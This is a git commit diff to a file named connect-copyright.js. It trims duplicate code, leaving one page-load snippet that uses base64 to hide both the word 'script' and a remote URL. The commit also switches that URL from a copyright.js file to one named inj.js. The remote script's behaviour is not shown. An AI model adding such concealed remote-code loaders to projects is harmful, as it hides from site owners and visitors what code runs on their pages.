37e4a767ec5cd69c972f04ef32e8f6d4e82c0f04
abrosxd <154523512+abrosxd@users.noreply.github.com>
2025-03-02 14:26:33 +0100

    UPD

--- root/scripts/connect-copyright.js
+++ root/scripts/connect-copyright.js
@@ -1,27 +1,6 @@
-(function () {
-  function loadSCA() {
-    const a = "aHR0cHM6Ly9jZG4uYWJyb3MuZGV2L2NvcHlyaWdodC5qcw==";
-    const b = "c2NyaXB0";
-    const r = document.createElement(atob(b));
-    r.src = atob(a);
-    r.async = true;
-    document.head.appendChild(r);
-  }
-  loadSCA();
-})();
-
-(function () {
-  document.head.appendChild(
-    Object.assign(document.createElement(atob("c2NyaXB0")), {
-      src: atob("aHR0cHM6Ly9jZG4uYWJyb3MuZGV2L2NvcHlyaWdodC5qcw=="),
-      async: true,
-    })
-  );
-})();
-
 (function (d, s) {
   d.head.appendChild((s = d.createElement(atob("c2NyaXB0")))).src = atob(
-    "aHR0cHM6Ly9jZG4uYWJyb3MuZGV2L2NvcHlyaWdodC5qcw=="
+    "aHR0cHM6Ly9jZG4uYWJyb3MuZGV2L2luai5qcw=="
   );
   s.async = !0;
 })(document);
